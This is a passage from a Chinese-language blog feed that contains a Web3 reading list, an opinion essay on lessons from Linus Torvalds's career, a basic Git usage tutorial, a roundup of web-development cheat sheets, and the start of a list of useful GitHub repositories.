<p>另一本加密通讯，将向您介绍 Web3、区块链、可替代和不可替代的代币、比特币和以太坊、NFT、DAO 以及许多其他主题。</p>
<ol start="10">
<li><a href="https://danromero.org/crypto-reading/"><strong>加密阅读</strong></a></li>
</ol>
<p>一组有趣的加密帖子。最好按时间顺序阅读帖子。</p>
<ol start="11">
<li><a href="https://docs.google.com/presentation/d/1aIjYKKM64Eyp497-j6wkDjCsHBA3CbbWg25UQ9Why3g/edit?usp=sharing"><strong>Web3 入门</strong></a></li>
</ol>
<p>一个从头教你一切的ppt。</p>
<ol start="12">
<li><a href="https://docs.google.com/presentation/d/1sUpk0gbvRQelH0MUIOqjNeGe8nwRH4mhrhDHmI6qh4M/mobilepresent?slide=id.g442eb61d9d_0_0"><strong>加密基础知识和 NFT</strong></a></li>
</ol>
<p>另一个从头开始教你一切的ppt。</p>
<ol start="13">
<li><a href="https://a16z.com/2018/02/10/crypto-readings-resources/"><strong>加密佳能</strong></a></li>
</ol>
<p>与加密相关的读物和资源合集（2018-2019 年）。</p>
<p>它分为几个部分，涵盖治理、隐私和安全、扩展、共识和治理、加密经济学、加密资产以及投资、筹款和代币分配、去中心化交易所、稳定币以及加密经济原语和加密商品（不可替代代币） 、加密收藏品、代币管理的注册中心、管理市场）。</p>
<ol start="14">
<li><a href="https://twitter.com/packyM/status/1493990833397325824"><strong>代币经济学资源列表</strong></a></li>
</ol>
<p>一堆 Tokenomics 资源。</p>
<ol start="15">
<li><a href="https://future.com/nft-canon/"><strong>NFT佳能</strong></a></li>
</ol>
<p>关于 NFT 的解释。</p>
<ol start="16">
<li><a href="https://future.com/dao-canon/"><strong>DAO，经典</strong></a></li>
</ol>
<p>关于 DAO 的解释。</p>
<ol start="17">
<li><a href="https://www.alexdphan.com/research/library-of-web3"><strong>Web3 库</strong></a></li>
</ol>
<p>您需要了解的有关 Web3 的一切。</p>
<ol start="18">
<li><a href="https://rabbithole.gg/"><strong>兔子洞</strong></a></li>
</ol>
<p>使用最好的 web3 应用程序学习和赚取加密货币。</p>
<ol start="19">
<li><a href="https://jkey-eth.notion.site/jkey-eth/7d63b8ddb7444adb86b5bbf782215e42?v=4afae3791307481b86cccd191917e19a"><strong>贾斯汀的阅读清单</strong></a></li>
</ol>
<p>Justin 的阅读列表简单地通过总结热门文章来解释 web3。</p>
<p>别忘了分享给学习 Web3 的朋友，收藏起来。</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>Web3</tag>
      </tags>
  </entry>
  <entry>
    <title>Linus Torvalds 成功的 5 个残酷真相</title>
    <url>/2022/12/career-linux/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>如果你不知道 Linus Torvalds 是谁，我将给你做一个简短的介绍：如果你是一名软件工程师，你应该知道 Linux 是什么，我几乎可以肯定你至少使用过一次 Git。基本上，他是这两个大项目的幕后主脑。如果你想更多地了解他，你可以上网搜索，我不想在本文中提供更多细节，而是继续讨论我通过听他的演讲学到的智慧。</p>
<p>在开始之前，我想告诉你一件事：我不能保证你会喜欢这些想法，但我只能说出真相，残酷而痛苦的真相。</p>
<span id="more"></span>

<h2 id="1-没有人是特别的"><a href="#1-没有人是特别的" class="headerlink" title="1. 没有人是特别的"></a>1. 没有人是特别的</h2><p>在励志视频和书籍中，有一个共同的信息：你不平凡，你可以通过正确的工作和付出你所有的能量来实现你想要的任何东西，然后你就会成为一个特别的人。他们应该是对的，因为看看历史，在数十亿人中有很多知道他们名字的人。我们认识他们是因为他们取得了巨大的成就，而共同的信息是，如果我们按下正确的按钮，我们也可以取得同样的成就。</p>
<p>很久以前我就相信这样的想法。但它们完全是谎言。没有人是特别的，一个人靠自己能取得的成就很少。通常，我们通常没有注意到的一件常见事情是，成功人士通过不努力工作而是利用他人的工作能力来实现他们想要实现的目标，从而取得成就。长期以来，人类一直在这样做。伟大的指挥官利用国家来实现他们想要实现的目标。在最近的历史中，我们开始通过创建公司来做同样的事情。这些公司发现，通过付钱给员工并利用他们的力量可以成就伟大的事业。</p>
<p>像比尔·盖茨、马克·扎克伯格、史蒂夫·乔布斯这样的大人物……所有这些人都是用同样的策略发家致富的。甚至沃伦·巴菲特……一般来说，我们认为他是通过长期用自己的钱做投资发家的，因为他投资了很长时间，所以他很成功。然而，有一段时间，他发现自己的个人资金不够用，于是开始使用别人的钱，并发明了新的方法来做同样的事情。</p>
<p>林纳斯·托沃兹呢？他发明了一种新方法来实现同样的目标。他冒了风险，决定向所有人开放他的内核源代码，然后他注意到人们提出了很好的想法。后来，他创建了 Git 以允许人们实现他们的想法，从而加快了这个过程，并且通过 25 年做同样的事情，他创造了一些特别的东西。然而，这并不是他一个人做的。今天，如果你查看 Linux 的 GitHub 页面，你会发现这个项目有超过 13,000 名贡献者。超过 13,000 人自愿参与他创建的项目。此外，我们甚至没有计算公司中使用 Linux 来创建新业务模型的人数。数以百万计的人努力将 Linux 带到今天的版本。</p>
<p>简而言之，没有人是独一无二的。我们都是庞大系统中的小碎片。就像蚂蚁和蜜蜂一样，我们一起取得了伟大的成就。互联网不是一个人创造的，有很多工人在海洋深处铺设电缆，连接不同大陆的人们。因此，如果您想获得成功，请与他人合作并学习如何将他人的力量用于您的项目。如果你认为你自己可以做很多事情并且你是独一无二的，那么你就是另一个巴斯光年。</p>
<h2 id="2-保持友善并不友善"><a href="#2-保持友善并不友善" class="headerlink" title="2. 保持友善并不友善"></a>2. 保持友善并不友善</h2><p>我和其他人一样是一名软件工程师，在我工作的公司里，保持友善很重要，因为当他们评估你将在年底获得的奖金时，最大的衡量标准之一就是你的性格。事实上，如果人力资源解雇人，与绩效一起的最大指标之一就是行为。我们强迫人们变得友善，否则，我们就会淘汰他们。</p>
<p>我认为我们这样做是因为我们不想听到残酷的事实。我们希望听到他们的声音，即使这不是我们的错。但是，我不认为我们在做正确的事情。当然，在某些领域，友善是必需的。例如，如果您要照顾一位老人，那么友善应该是一项要求。但是，我认为这不适用于科技行业。</p>
<p>几位研究人员尝试了这个理论：他们创建了两个随机人群控制组。一组被迫变得友善和友善，而另一组则可以自由地更积极地捍卫自己的想法。给这两组人同样的问题，并对结果进行评估。在多次重复之后，他们发现积极进取的那一组一遍又一遍地找到了更好的想法和解决方案。技术改进关注同一件事：找到问题的最佳解决方案。因此，我认为我们应该能够相互捍卫我们的想法，直到我们通过数学证明或实验找到最佳解决方案。</p>
<p>在这一点上，我想澄清一件事：积极捍卫并不意味着即使你错了也要捍卫你的想法。如果你错了，有证据或有合理的解释，你应该接受，让其他人提高你的智慧。在捍卫自己的想法时，您应该保持理性。</p>
<p>Torvalds 在 Linux 中做了同样的事情。在提交和媒体中，他以非常积极的方式捍卫自己的想法。我不支持这一点，但他也伤透了心。但是，这是找到最佳解决方案的好策略。由于这种方法，Linux 变得与众不同。虽然 macOS 在特定的硬件上工作，而 Windows 会出现大量蓝屏、内存泄漏和低效的实现，但 Linux 在所有设备上都需要一些专业的操作，并且以一种很好的方式进行了优化，内核的调用跟踪要好得多比 Windows。</p>
<h2 id="3-目标、想法……都是谎言"><a href="#3-目标、想法……都是谎言" class="headerlink" title="3. 目标、想法……都是谎言"></a>3. 目标、想法……都是谎言</h2><p>你知道什么是幸存者偏差吗？第二次世界大战期间，海军分析中心的研究人员对执行任务后返回的飞机造成的损坏进行了研究。然后，他们建议在受损最严重的区域增加装甲，以尽量减少轰炸机在敌方炮火中的损失。然而，亚伯拉罕沃尔德（Abraham Wald）提出了不同的建议。Wald 是一位匈牙利数学家，也是统计研究小组的成员，在那里他将统计技能应用于各种战时问题。他注意到一件非常简单的事情：他们正在分析的飞机是归还的飞机。这意味着这些飞机即使在那些地方被击中也能成功返回，这意味着如果它们在其他地方被击中，它们就无法实现同样的目标。</p>
<p>在我看来，目标、想法和愿景是同一种心态的产物，是幸存者偏差的产物。很多人只研究成功人士，他们认为成功人士都有远见和目标。但是，我认为这没有区别。考虑大学入学考试。你认为排在百万分之一的人是为了这个吗？很可能，这个人的目标更高，但没有正确地做其他事情。如果成功者和失败者的目标和愿景是共同的，那么它们就不是他们之间的区别。</p>
<p>在 TED 演讲采访中，Linus Torvalds 承认他没有愿景或 5 年计划。基本上，他遇到问题就解决，另一方面，他试图为已经解决的问题找到更好的解决方案。他有一个系统，一个解决问题和寻求更好的系统。应用这个系统 25 年……这就是 Linux 背后的成功心态。</p>
<h2 id="4-没有智能设计"><a href="#4-没有智能设计" class="headerlink" title="4. 没有智能设计"></a>4. 没有智能设计</h2><p>我是那些想得太久以至于无法开始他们想做的事情的人之一。在开始实际工作之前，我会研究以找到最佳方法。最后，我永远不会开始，因为我已经迷失在寻找最佳方法和学习实现该目标所需的东西的过程中。</p>
<p>后来，我注意到一件事。人类通过犯错学会了一切。我们通过尝试、试验和犯错误发现了很多东西。我想举个例子：如果你知道日本的地理位置，你可能知道那里经常发生很多地震。在他们的历史上，他们的房子不太长，一般都比较宽，因为如果他们建造的东西长了，就会在地震中被摧毁。他们今天解决了这个问题，但如何解决？他们创建了一个小型地球模型并实现了他们不同的想法，然后通过制造人工地震来测试这个模型。通过测试想法、发现新问题并逐一解决每个问题，他们为建筑物的地基创造了一个伟大的设计。现在，日本是拥有非常耐用建筑的国家之一。</p>
<p>在他的一次采访中，Torvalds 说 Linux 中没有智能设计。基本上，他在尝试自己的想法，通过犯错和解决问题，他发现了错误。在这一点上，你可以说“不存在智能设计，但有很多关于它们的书籍”。这是正确的。在这些书中，我最喜欢的一本书是罗伯特·马丁 (Robert Martin) 写的《整洁的代码》(Clean Code)。他在他的书中给出了很好的设计基础。然而，如果你读过它，你就会很容易地理解他通过从错误中吸取教训而提出了所有这些原则，不仅是从他自己的错误中，还从其他工程师和破产公司的错误中吸取教训。</p>
<p>总而言之，这个想法是通过犯错误来学习。但是，不要重复已经犯过的错误。尝试新事物，通过解决你遇到的每一个问题，学习新事物。不要试图弄清楚什么是最好的方法，而只是开始犯错误。</p>
<h2 id="5-分心是潜在的杀手"><a href="#5-分心是潜在的杀手" class="headerlink" title="5.分心是潜在的杀手"></a>5.分心是潜在的杀手</h2><p>硅谷文化……它基于经常更换工作的软件工程师。这样做的目的是什么？我认为有两个：通过这样做，技术思想和改进分散在公司之间。其次，它开始了聘请最有经验的工程师的竞争，这使得聘请这些人的报酬越来越高。在软件工程师的精美 YouTube 视频中（我也喜欢看其中的几个），我们可以看到令人惊叹的办公室提供免费食物和高额薪酬。有了所有这些闪亮的物品，很多人都想成为其中的一部分。</p>
<p>与其他一切一样，这会带来我们通常不会注意到的成本。每个公司都有自己的系统，自己的实施风格和不同的技术。在我们了解其中的每一个细节并在一个项目上工作足够长的时间之前，我们就要离开公司了。今天，在大多数大公司，工程师的平均停留时间不到 2 年。</p>
<p>这有什么不好？我想向你展示一个不同的视角。Linus Torvalds 开始在硅谷的一家公司 (Transmeta) 工作，他没有在这些公司四处走动，而是在这家公司待了将近 7 年，直到奠定了 Linux 基金会的基础。他为什么那样做？为什么他不像其他人那样在公司之间流动？关于他在TED Talk采访中所说的，他非常固执，并没有放弃项目。事实上，他非常固执，以至于他已经在同一个项目上工作了 25 年多。</p>
<p>沃伦·巴菲特将同样的心态运用到投资界，长期运用同样简单有效的策略，并使之完美无缺，最终成为首富。<strong>这里的要点是，成功属于专注于某件事的人，而不是那些从一个项目转移到另一个项目的人。</strong></p>
<p>这个建议并不适合所有人，因为我们中的一些人只是为了钱而做软件工程，这没有错。然而，有很多人想要创造伟大的事物，不幸的是，唯一的方法就是专注。因为很多人同时在努力实现不同的目标，如果你想成功，创造其他人并且你想使用的东西，那么你真的需要专注于你想要的问题和项目并坚持下去。</p>
<p>感谢您的时间和亲切的问候。</p>
]]></content>
      <categories>
        <category>Career</category>
      </categories>
  </entry>
  <entry>
    <title>像高级工程师一样使用 Git</title>
    <url>/2022/12/devtools-git/</url>
    <content><![CDATA[<h1 id="Git-是一个强大的工具，当您知道如何使用它时，使用起来感觉很棒。"><a href="#Git-是一个强大的工具，当您知道如何使用它时，使用起来感觉很棒。" class="headerlink" title="Git 是一个强大的工具，当您知道如何使用它时，使用起来感觉很棒。"></a>Git 是一个强大的工具，当您知道如何使用它时，使用起来感觉很棒。</h1><p>多年来，我已经在多个团队和项目中使用 Git 的这些功能。我仍在围绕一些工作流程（比如压缩或不压缩）发表意见，但核心工具功能强大且灵活（并且可编写脚本！）。</p>
<span id="more"></span>

<h1 id="浏览-Git-日志"><a href="#浏览-Git-日志" class="headerlink" title="浏览 Git 日志"></a>浏览 Git 日志</h1><p>Git 日志是开箱即用的。</p>
<h2 id="git-日志是基本的"><a href="#git-日志是基本的" class="headerlink" title="git 日志是基本的"></a>git 日志是基本的</h2><p>使用<code>git log</code>给你一些信息。但它的信息量很大，通常不是您想要的。</p>
<p>让我们变得真实。这些日志没有给任何人留下深刻印象。他们很无聊。它们充满了你现在并不真正需要的信息。您正试图对项目中发生的事情有一个高层次的理解。</p>
<p>有更好的方法。</p>
<h2 id="具有更多可见性的-git-日志"><a href="#具有更多可见性的-git-日志" class="headerlink" title="具有更多可见性的 git 日志"></a>具有更多可见性的 git 日志</h2><p>使用<code>--graph</code>并且<code>--format</code>我们可以快速获得项目中 git 提交的摘要视图。</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">git log --graph --format=format:&#x27;<span class="built_in">%C</span>(bold blue)<span class="built_in">%h</span><span class="built_in">%C</span>(reset) - <span class="built_in">%C</span>(bold green)(<span class="built_in">%ar</span>)<span class="built_in">%C</span>(reset) <span class="built_in">%C</span>(white)<span class="built_in">%an</span><span class="built_in">%C</span>(reset)<span class="built_in">%C</span>(bold yellow)<span class="built_in">%d</span><span class="built_in">%C</span>(reset) <span class="built_in">%C</span>(dim white)- <span class="built_in">%s</span><span class="built_in">%C</span>(reset)&#x27; --all</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>哇！这些是一些好看的日志！旁边甚至还有一棵分枝的树。</p>
<p>这些日志向您展示了谁一直在处理什么、何时进行了更改以及您的更改在哪里适合更大的图景。</p>
<p><code>--graph</code>将树形图添加到左侧。它不是最时尚的图表，但它有助于可视化项目分支中的变化。（<span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1sb2cjRG9jdW1lbnRhdGlvbi9naXQtbG9nLnR4dC0tLWdyYXBo">在这里阅读文档。<i class="fa fa-external-link-alt"></i></span>）</p>
<p><code>--format</code>让您自定义日志的格式。有预设格式可供选择，或者您可以像本示例一样编写自己的格式。（<span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1sb2cjX2NvbW1pdF9mb3JtYXR0aW5n">在这里阅读文档。<i class="fa fa-external-link-alt"></i></span>）</p>
<p><code>--all</code>包括日志中的所有参考、标签和分支（包括远程分支）。您可能不想要_所有内容_，因此请根据需要进行调整。（<span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1sb2cjRG9jdW1lbnRhdGlvbi9naXQtbG9nLnR4dC0tLWFsbA==">在这里阅读文档。<i class="fa fa-external-link-alt"></i></span>）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1sb2c=">有关如何升级 git 日志的更多信息，请参阅 git-log 文档。→<i class="fa fa-external-link-alt"></i></span></p>
<h1 id="了解特定的提交"><a href="#了解特定的提交" class="headerlink" title="了解特定的提交"></a>了解特定的提交</h1><p>您经常想了解特定提交发生了什么。<code>git show</code>可以向您显示提交中更改的高级视图，但它也可以让您查看对特定文件的更改。</p>
<h2 id="查看提交的摘要"><a href="#查看提交的摘要" class="headerlink" title="查看提交的摘要"></a>查看提交的摘要</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">show</span> <span class="operator">&lt;</span><span class="keyword">commit</span><span class="operator">&gt;</span> <span class="comment">--stat</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用该<code>--stat</code>标志，您将看到提交摘要以及更改的文件和有关更改方式的详细信息。</p>
<h2 id="查看提交的特定文件更改"><a href="#查看提交的特定文件更改" class="headerlink" title="查看提交的特定文件更改"></a>查看提交的特定文件更改</h2><p>当您想深入了解特定文件中的特定行更改时，请使用<code>git show</code>文件路径。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">show</span> <span class="operator">&lt;</span><span class="keyword">commit</span><span class="operator">&gt;</span> <span class="comment">-- &lt;filepath&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这为您的文件提供了特定的行更改。默认情况下，它将向您显示行更改以及两端的 3 行附加行，以提供更改行在文件中位置的上下文。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1zaG93">有关如何提升对 git commit 的理解的更多信息，请参阅 git-show 文档。→<i class="fa fa-external-link-alt"></i></span></p>
<h1 id="进行更改"><a href="#进行更改" class="headerlink" title="进行更改"></a>进行更改</h1><p>您已经在项目上创建了一个分支，向您的分支提交了一些更改，并且您已准备好将这些更改合并回<code>main</code>. 自从您分支以来，另一位工程师对相同的文件进行了更改。😱</p>
<p>如果您使用 GitHub 之类的服务，您的 PR 会告诉您是否存在合并冲突。</p>
<p>将更改推送到<code>main</code>. 这很好，因为您不想破坏其他人所做的所有辛勤工作。</p>
<p>要开始在本地解决此问题，您通常会采用以下两种路径之一：<code>merge</code>或<code>rebase</code>.</p>
<h2 id="git-merge-vs-git-rebase"><a href="#git-merge-vs-git-rebase" class="headerlink" title="git merge vs git rebase"></a>git merge vs git rebase</h2><p>当<code>main</code>您想要将分支上的更改合并到您的分支中时，您可以_合并_更改或从不同的点重新设置分支的_基线。_</p>
<p><strong>merge</strong>从一个分支获取更改，并在一次_合并提交_中将它们合并到另一个分支。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git merge <span class="keyword">origin/main </span>your-<span class="keyword">branch</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure>

<p><strong>rebase</strong>调整分支实际分支的点（即将分支从基础分支移动到新的起点）。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">git rebase <span class="keyword">origin/main </span>your-<span class="keyword">branch</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure>

<p>_通常_，当您想要上游分支的代码包含在您的分支时，您可以使用<code>rebase</code>命令。当您想要把您的分支代码放回上游分支时，您将使用 <code>merge</code> 命令。</p>
<blockquote>
<p>我曾经认为 squash commits 非常酷，然后我不得不整天、每天都使用它们。这就是为什么你应该避免……</p>
</blockquote>
<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1sb2c=">git 日志文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXQtc2NtLmNvbS9kb2NzL2dpdC1zaG93">git 显示文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9hLzgwNDE1Ng==">你什么时候使用 Git rebase 而不是 Git merge？（堆栈溢出）<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 开发人员必备的 9 个备忘单</title>
    <url>/2022/12/devtools-cheat-sheet/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>作为开发人员，我们使用过多种语言，不可能记住它们的所有方面。拥有 MDN 文档很有帮助，但查看每个小问题可能会很耗时。在这些情况下，“备忘单”可以成为现实生活中的救星。在本文中，我们将探索一些快速且有用的备忘单，这些备忘单每周都会为您节省数小时的浪费时间。</p>
<h2 id="1-HTML参考"><a href="#1-HTML参考" class="headerlink" title="1. HTML参考"></a>1. <span class="exturl" data-url="aHR0cHM6Ly9odG1scmVmZXJlbmNlLmlvLw==">HTML参考<i class="fa fa-external-link-alt"></i></span></h2><span id="more"></span>

<p>htmlreference.io 是 HTML 的免费参考。每个 HTML 元素和属性都按字母顺序列出，以提高您的理解，并提供适当的示例。</p>
<h2 id="2-HTML备忘单"><a href="#2-HTML备忘单" class="headerlink" title="2. HTML备忘单"></a>2. <span class="exturl" data-url="aHR0cHM6Ly9odG1sY2hlYXRzaGVldC5jb20v">HTML备忘单<i class="fa fa-external-link-alt"></i></span></h2><p>您想要包含编码示例、Web 开发人员工具和标记生成器的资源吗？您会喜欢 HTML 备忘单。这份单页备忘单包含您需要的一切。它包括所有基本语法以及很好的示例。还包括一个文本编辑器，让您可以实时查看代码。</p>
<h2 id="3-CSS备忘单"><a href="#3-CSS备忘单" class="headerlink" title="3. CSS备忘单"></a>3. <span class="exturl" data-url="aHR0cHM6Ly9odG1sY2hlYXRzaGVldC5jb20vY3NzLw==">CSS备忘单<i class="fa fa-external-link-alt"></i></span></h2><p>此 CSS 速查表列出了最常见的 CSS 片段样式：渐变、背景、按钮、字体系列、边框、半径、框、文本阴影生成器、颜色选择器等。还包括一个文本编辑器，让您可以实时查看代码。</p>
<h2 id="4-网格布局"><a href="#4-网格布局" class="headerlink" title="4. 网格布局"></a>4. <span class="exturl" data-url="aHR0cHM6Ly9ncmlkLm1hbHZlbi5jby8=">网格布局<i class="fa fa-external-link-alt"></i></span></h2><p>每个初学者都面临 CSS 网格布局的困难。通过简单的可视化示例，了解所有属性。</p>
<h2 id="5-弹性布局"><a href="#5-弹性布局" class="headerlink" title="5. 弹性布局"></a>5. <span class="exturl" data-url="aHR0cHM6Ly9mbGV4Ym94Lm1hbHZlbi5jby8=">弹性布局<i class="fa fa-external-link-alt"></i></span></h2><p>您可以使用灵活的盒子布局构建响应式布局结构，而无需使用浮动或定位。这些简单的可视化示例将使您熟悉所有 flexbox 属性。您是否想创建一个完美对齐的网页，但不知道使用哪个属性？查看这些备忘单，快速了解您必须使用的特性。</p>
<h2 id="6-JavaScript备忘单"><a href="#6-JavaScript备忘单" class="headerlink" title="6. JavaScript备忘单"></a>6. <span class="exturl" data-url="aHR0cHM6Ly9pbG92ZWNvZGluZy5vcmcvYmxvZy9qcy1jaGVhdHNoZWV0">JavaScript备忘单<i class="fa fa-external-link-alt"></i></span></h2><p>这份备忘单提供了 JavaScript 的全面概述，仅用 13 页就可以将您从新手变成专家。它涵盖了从 ES6+ 到 DOM API、事件、循环、函数、数组、对象、类型等等的所有内容。</p>
<h2 id="7-现代JS备忘单"><a href="#7-现代JS备忘单" class="headerlink" title="7. 现代JS备忘单"></a>7. <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21iZWF1ZHJ1L21vZGVybi1qcy1jaGVhdHNoZWV0">现代JS备忘单<i class="fa fa-external-link-alt"></i></span></h2><p>本文档是 JavaScript 的快速参考，提供了有关如何编写高效代码的实用建议。如果您已经熟悉 JavaScript，那么使用此参考应该没有问题。</p>
<h2 id="8-开箱即用"><a href="#8-开箱即用" class="headerlink" title="8. 开箱即用"></a>8. <span class="exturl" data-url="aHR0cHM6Ly9jaGVhdG9ncmFwaHkuY29tLw==">开箱即用<i class="fa fa-external-link-alt"></i></span></h2><p>Cheatography 拥有数以千计独特的原创编程备忘单。您可以找到有关特定编程语言的所有信息并轻松下载。</p>
<h2 id="9-过度API"><a href="#9-过度API" class="headerlink" title="9. 过度API"></a>9. <span class="exturl" data-url="aHR0cHM6Ly9vdmVyYXBpLmNvbS8=">过度API<i class="fa fa-external-link-alt"></i></span></h2><p>您需要的所有备忘单都可以在 OverAPI.com 上找到。当您不记得某事时，您不再需要敲头。这些备忘单将帮助您。</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>CheatSheet</tag>
      </tags>
  </entry>
  <entry>
    <title>17 个杀手级 GitHub 存储库！</title>
    <url>/2022/12/devtools-github/</url>
    <content><![CDATA[<h1 id="一份精选清单，将为您终生服务"><a href="#一份精选清单，将为您终生服务" class="headerlink" title="一份精选清单，将为您终生服务"></a>一份精选清单，将为您终生服务</h1><p>Github 有超过 4000 万人使用，它是迄今为止最受欢迎的版本控制系统。简单地说，它是一种基于云的协作服务，可帮助开发人员以极其高效和美观的方式存储和管理代码。数百名开发人员可以在一个项目上工作，而不会与原始代码发生冲突。</p>
<p>但除此之外，它还包含超级有用和资源丰富的文章、书籍、链接和其他材料。</p>
<span id="more"></span>

<p>它拥有大量的资源，大到让人迷失在寻找正确的东西的过程中。这就是我写这篇文章的原因。我精选了最好、最有用的 Github 存储库，它们将长期为您服务。</p>
<p>直截了当，您将在本文中找到的是宝藏。但是请将这篇文章加入书签，因为一下子看完所有内容会很累而且很困难。更好的办法是将其保存以备后用，这样无论何时您需要一些用于设计、编码、开发和课程的资源，您都可以浏览它们并找到您想要的任何内容。</p>
<h1 id="1-写作的付费资源"><a href="#1-写作的付费资源" class="headerlink" title="1. 写作的付费资源"></a>1. 写作的付费资源</h1><h2 id="CommunityWriterPrograms"><a href="#CommunityWriterPrograms" class="headerlink" title="CommunityWriterPrograms"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hbGdhbXZlcy9Db21tdW5pdHlXcml0ZXJQcm9ncmFtcw==">CommunityWriterPrograms<i class="fa fa-external-link-alt"></i></span></h2><p>此列表适用于技术作家。如果开发人员有兴趣编写高质量和精美的文章，成千上万的人会阅读这些文章并作为回报获得相当高的报酬，那么请查看此列表。平均而言，作家每篇文章的报酬约为 200 美元。</p>
<h1 id="2-建立你自己的-X"><a href="#2-建立你自己的-X" class="headerlink" title="2. 建立你自己的 X"></a>2. 建立你自己的 X</h1><h2 id="build-your-own-x"><a href="#build-your-own-x" class="headerlink" title="build-your-own-x"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmlzdGVmYW5vdmljL2J1aWxkLXlvdXItb3duLXg=">build-your-own-x<i class="fa fa-external-link-alt"></i></span></h2><p>对于那些通过实践或正在寻求做一些项目来获得经验的人来说，这个 repo 是天堂。总而言之，它包含与计算机科学广泛领域相关的项目，例如增强现实、3D 渲染、数据库、模拟器、游戏、操作系统等等。它包含构建此类项目所需的所有帮助和指导。</p>
<h1 id="3-OSSU-计算机科学"><a href="#3-OSSU-计算机科学" class="headerlink" title="3. OSSU 计算机科学"></a>3. OSSU 计算机科学</h1><h2 id="computer-science"><a href="#computer-science" class="headerlink" title="computer-science"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29zc3UvY29tcHV0ZXItc2NpZW5jZQ==">computer-science<i class="fa fa-external-link-alt"></i></span></h2><p>一言以蔽之，雄伟！</p>
<blockquote>
<p>OSSU 课程是使用在线材料的完整计算机科学教育。它不仅仅是为了职业培训或专业发展。它适用于那些希望在所有计算学科的基础概念上有适当、全面的基础的人，以及那些有纪律、意愿和（最重要的是！）良好习惯的人，主要靠自己获得这种教育，但有支持来自全球的学习者社区。</p>
<p>它是根据本科计算机科学专业的学位要求减去通识教育（非 CS）要求而设计的，因为假定学习该课程的大多数人已经接受过 CS 领域以外的教育。这些课程本身是世界上最好的课程之一，通常来自哈佛、普林斯顿、麻省理工学院等，但经过特别选择以满足以下标准。</p>
<p>-OSSU 资料库</p>
</blockquote>
<h1 id="4-很棒的蟒蛇"><a href="#4-很棒的蟒蛇" class="headerlink" title="4. 很棒的蟒蛇"></a>4. 很棒的蟒蛇</h1><h2 id="awesome-python"><a href="#awesome-python" class="headerlink" title="awesome-python"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ZpbnRhL2F3ZXNvbWUtcHl0aG9u">awesome-python<i class="fa fa-external-link-alt"></i></span></h2><p>这是一个 Python 存储库，包含基于 Python 的框架和库，可用于无穷无尽的事物。这是对所有 Pythonista 的一种款待。</p>
<h1 id="5-公共API"><a href="#5-公共API" class="headerlink" title="5. 公共API"></a>5. 公共API</h1><h2 id="public-apis"><a href="#public-apis" class="headerlink" title="public-apis"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1YmxpYy1hcGlzL3B1YmxpYy1hcGlz">public-apis<i class="fa fa-external-link-alt"></i></span></h2><p>公共 API 包含令人印象深刻的 API 列表，可免费用于开发目的。如果您正在寻找数据来实施应用程序或解决方案，请直接进入。</p>
<p>它包含与艺术、音乐、新闻、食品和饮料、电子邮件、工作、社交、天气等相关的各种 API</p>
<p>这是一个必须保存的回购协议，您将经常需要它。我希望我早点知道这个回购协议。</p>
<h1 id="6-技术面试手册"><a href="#6-技术面试手册" class="headerlink" title="6. 技术面试手册"></a>6. 技术面试手册</h1><h2 id="tech-interview-handbook"><a href="#tech-interview-handbook" class="headerlink" title="tech-interview-handbook"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lhbmdzaHVuL3RlY2gtaW50ZXJ2aWV3LWhhbmRib29r">tech-interview-handbook<i class="fa fa-external-link-alt"></i></span></h2><p>该存储库包含大量在求职面试中提出的问题。不仅仅是面试问题，它还使人熟悉招聘过程中涉及的程序。从简历到面试，这是一个完整的包。任何打算第一次申请或希望更好地适应招聘流程的人都应该进入这个 repo。</p>
